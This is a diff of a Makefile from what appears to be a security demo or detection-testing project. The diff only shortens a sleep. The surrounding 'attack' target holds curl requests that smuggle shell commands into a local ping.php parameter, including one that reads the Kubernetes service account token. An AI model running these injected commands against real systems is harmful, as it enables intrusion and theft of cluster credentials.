@@ -139,7 +139,7 @@ attack:
 	curl "127.0.0.1:8080/ping.php?ip=1.1.1.1%3Bcat%20index.html"
 	curl "127.0.0.1:8080/ping.php?ip=1.1.1.1%3Bcurl%20github.com"
 	curl "127.0.0.1:8080/ping.php?ip=1.1.1.1%3Bcat%20/run/secrets/kubernetes.io/serviceaccount/token"
-	sleep 60
+	sleep 10
 
 .PHONY: kubescape
 kubescape: storage
